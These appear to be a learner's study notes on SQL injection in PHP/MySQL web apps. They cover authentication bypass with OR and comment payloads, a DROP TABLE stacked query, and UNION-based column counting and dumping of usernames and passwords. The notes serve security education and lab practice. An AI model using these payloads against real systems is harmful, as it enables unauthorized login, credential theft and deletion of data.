## 1- Intro to SQL Injections
####  Use of SQL in Web Applications
within a `PHP` web application, we can connect to our database, and start using the `MySQL` database through `MySQL` syntax (ex. user can search for users), right within `PHP`, as follows:
```php
$conn = new mysqli("localhost", "root", "password", "users");
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```
The below PHP code will print all returned results of the SQL query in new lines:
```php
while($row = $result->fetch_assoc() ){
	echo $row["name"]."<br>";
}
```

==**If we use user-input within an SQL query, and if not securely coded, it may cause a variety of issues, like SQL Injection vulnerabilities.***==

#### 2- What is an Injection?
Injection occurs when an application misinterprets user input as actual code rather than a string,This can occur by escaping user-input bounds by injecting a special character like (`'`), and then writing code to be executed
#### SQL Injection
example of user-input can be used within an SQL query without any sanitization:
```php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```
**we can add a single quote (`'`), which will end the user-input field, and after it, we can write actual SQL code (ex." ==1'; DROP TABLE users;== " )**  
```php
select * from logins where username like '%1'; DROP TABLE users;'
```
escape the original query's bounds and have our newly injected query execute as well. `Once the query is run, the` users `table will get deleted.`
####  Syntax Errors
The previous example of SQL injection would return an error: `Error: near line 1: near "'": syntax error` ,This is because of the last trailing character, where we have a single extra quote (`'`) that is not closed:  **1'; DROP TABLE users;'**
we can fix this syntax errors by :  
1.  using `comments`
2. passing in multiple single quotes (') 
####  Types of SQL Injections
SQL Injections are categorized based on how and where we retrieve their output.
![[Pasted image 20251101134315.png]]

**1- In-band SQL injection:** the output of both the intended and the new query may be printed directly on the front end, and we can directly read it,  and it has two types: `Union Based` and `Error Based`.
- `Union Based SQL injection`: we may have to specify the exact location, 'i.e., column', which we can read, so the query will direct the output to be printed there
- `Error Based` SQL injection, it is used when we can get the `PHP` or `SQL` errors in the front-end, and so we may intentionally cause an SQL error that returns the output of our query.

**2- Blind SQL injection:** the output it is't printed so we may utilize SQL logic to retrieve the output character by character. This is known as `Blind` SQL injection, and it also has two types: `Boolean Based` and `Time Based`. 
- `Boolean Based` SQL injection, we can use SQL conditional statements to control whether the page returns any output at all, 'i.e., original query response,' if our conditional statement returns `true`.
- `Time Based` SQL injections, we use SQL conditional statements that delay the page response if the conditional statement returns `true` using the `Sleep()` function.

**3- Out-of-band SQL injection:**  no direct access to the output whatsoever, so we may have to direct the output to a remote location, 'i.e., DNS record,' and then attempt to retrieve it from there


## 2- Subverting Query Logic
We’ll learn how to change a web app’s original SQL query  by injecting operators and comments — a common first step in SQL injection (SQLi), often used to bypass authentication.
#### Authentication Bypass
![[Pasted image 20251101171530.png]]
Given a login that runs:
```sql
SELECT * FROM logins WHERE username='admin' AND password='p@ssw0rd';
```

If the app builds the query from user input without safe handling, we can manipulate that WHERE clause to make it always true and bypass login.

#### SQLi Discovery
Test inputs that break or alter the query (may need URL-encoding for GET requests):
`' -> %27`  
`" -> %22`  
`# -> %23`  
`; -> %3B`  
`) -> %29`
>Note: In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'.

```sql
SELECT * FROM logins WHERE username=''' AND password = 'something';
	 -- ERROR: You have error in your sql
```
A single quote (`'`) often causes a syntax error if quotes become unbalanced  that tells you the input is used directly in SQL.
#### OR Injection

Inject an expression that is always true (e.g. `1=1`) combined with `OR` to force the WHERE clause true. Keep quotes balanced to avoid syntax errors.
```
admin' OR '1'='1
```

Resulting query:
```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```
![[Pasted image 20251101171941.png]]
 **`AND` is evaluated before `OR`.**
 - `'1'='1'` is true, `password='something'` is false → ==the `AND` part is false.==

 **Then `OR` is applied:**
- if `username='admin'` exists ==the whole WHERE becomes true.==
 ==Result==: **the query returns rows (bypasses authentication) ==if the username exists.**==

>Note: The payload we used above is one of many auth bypass payloads we can use to subvert the authentication logic. You can find a comprehensive list of SQLi auth bypass payloads in [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass), each of which works on a certain type of SQL queries.

#### Auth Bypass with OR operator
```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```
![[Pasted image 20251101172611.png]]
We were able to log in successfully as admin. However, what if we did not know a valid username? Let us try the same request with a different username this time.
![[Pasted image 20251101172656.png]]
![[Pasted image 20251101173846.png]]
**If you don’t know a valid username ? , inject into password too with==' OR '1'='1== :**
```
SELECT * FROM logins WHERE username='Notadmin ' OR '1'=1' AND password='something ' OR '1'=1';
```
![[Pasted image 20251101173135.png]]

The additional `OR` condition resulted in a `true` query overall, as the `WHERE` clause returns everything in the table, and the user present in the first row is logged in. In this case, as both conditions will return `true`, we do not have to provide a test username and password and can directly start with the `'` injection and log in with just `' or '1' = '1`.

![[Pasted image 20251101173227.png]]

##### auth with specific user

```sql
SELECT * FROM logins WHERE username='tom ' OR '1'='1' AND password = 'test';
```
'1'='1' AND password = 'test' ==> false
**username='tom ' OR  false ==> TRUE** 
==Login successful as user:== **tom**

```SQL
 SELECT * FROM logins WHERE username='tom' AND password = 'test' OR '1'='1';
```
username='tom' AND password = 'test' ==> False 
**FALSE OR '1'='1' ==> TRUE** 
==Login successful as user==: **admin**  (coz it will return the full table of the users then it will login with the user in the  first row in our case admin )

> auth  specific user need the sql to be   **username='tom ' OR  false ==> TRUE**  (by adding the ' OR '1'='1 to the  username input  )

## 3- Using Comments
  SQL comments can be abused to remove parts of the original query and craft a working injection that bypasses authentication.
#### Comments

MySQL supports line comments `--` (must be followed by a space), `#`, and block comments `/* ... */` (less common in injections).  
Examples:
```sql
SELECT username FROM logins; -- selects usernames
SELECT * FROM logins WHERE username = 'admin'; # comment here
```

- When sending payloads in a URL, `#` must be URL-encoded as `%23`.
- `--` requires a trailing space (`--` ). Browsers often encode spaces as `+` or `%20` (`--+`).
#### Auth Bypass with comments
```sql
SELECT * FROM logins WHERE username='admin' AND password='...';
```

You can terminate the user input and comment out the rest so the password check is ignored. by using the Payload (username) ==admin' --==  :

so it Becomes:
```sql
SELECT * FROM logins WHERE username='admin' -- ' AND password='...';
```
**Password check is commented out, so the query returns the `admin` row.**

>The server protocol does not require you to include a semicolon **;**  for a single statement sent over the connection , it's optional in that sense.
#### Another Example

If the query contains parentheses (ex. `WHERE (username='' ) ` ), simple commenting  using `admin')-- ` can cause unbalanced syntax.  Example :
```sql
SELECT * FROM logins WHERE (username='admin' -- AND id > 1) AND password='...';
```

`admin'--` may produce a syntax error because the opening `(` remains unclosed. Fix by closing parentheses before commenting ==> `admin') -- `:
```sql
SELECT * FROM logins WHERE (username='admin') -- ' AND id > 1) AND password='...';
```
Now the remainder is commented out and the query is valid, returning the `admin` row.

***another example: if we don't know the username use the ID***
```sql
SELECT * FROM logins WHERE (username='test' OR id = 5) -- ' AND id > 1) AND password = '375a52cb87b22005816fe7a418ec6660';
```


## 4- Union Clause

The `UNION` operator combines results from multiple `SELECT` statements into one result set. In SQLi, `UNION` injection lets you append a crafted `SELECT` to the original query so you can retrieve data from other tables/databases.

Example: combine two tables' outputs:
```sql
SELECT * FROM ports;
SELECT * FROM ships;
-- combined:
SELECT * FROM ports UNION SELECT * FROM ships;
```

`UNION` merges rows from both queries into a single output.

> Note: corresponding columns (by position) should have compatible data types.

#### Even Columns

All `SELECT` statements in a `UNION` must return the **same number of columns**. If they don’t, you’ll get an error:

```sql
-- ERROR: The used SELECT statements have a different number of columns
SELECT city FROM ports UNION SELECT * FROM ships;
```

To extract data via injection, match the number of columns in the original query.  
Example injection (let say the products table has 2 columns):

```sql
SELECT * FROM products WHERE product_id='1'
   -- products table =  2 columns
UNION SELECT username, password FROM passwords-- '
```
#### Un-even Columns
If the original query returns N columns but you only want M useful columns, fill the remaining columns with safe “junk” values (numbers, strings, or `NULL`) so column counts match and types are compatible.
- Use `NULL` as a universal filler when unsure of types.
- Use distinct numeric fillers (e.g., `1,2,3`) to identify which column contains the dumped values.
- Example: original has 4 columns, extract one username:

```sql
SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '
+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```

Result: the injected row appears with `username` in the first column and fillers in the rest.


## 5- Union Injection
let use union injection in our SQL injections :
first we test the sql injection vlun exist with ( **'**)
![[Pasted image 20251102171455.png]]
If a parameter causes a SQL error when you inject `'`, the page may be vulnerable. With `UNION` injection you append a crafted `SELECT` to the original query to retrieve data from other tables.
#### Detect number of columns
You must match the number of columns returned by the original query.
 Example : SELECT ==ID,NAME== **UNION** SELECT ==1,2== -- - 

##### Using ORDER BY
sorts the results by a column we specified, 'i.e., column 1, column 2, and so on', until we get an error saying the column specified does not exist.

Increment column index until you hit an error:
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
```
![[Pasted image 20251102172646.png]]
```sql
' ORDER BY 5-- -  -- error → table has 4 columns
```
![[Pasted image 20251102172712.png]]

This means that this table has exactly 4 columns .
##### Using UNION
Try `UNION SELECT` with increasing column counts until it succeeds, Use simple numeric fillers so you can spot which columns echo:
```sql
cn' UNION SELECT 1,2,3-- -   -- error
cn' UNION SELECT 1,2,3,4-- - -- success → 4 columns
```
![[Pasted image 20251102172618.png]]
This time we successfully get the results, meaning once again that the table has 4 columns
#### Location of Injection
Not every returned column is displayed. Use distinct fillers (`1,2,3,...`) to identify which result columns the page prints.To test that we can get actual data from the database 'rather than just numbers,' we can use the `@@version` SQL query as a test and place it in the columns number that printed 

Example: test DB version in column 2
```sql
cn' UNION SELECT 1, @version, 3, 4-- -
```
![[Pasted image 20251102172430.png]]

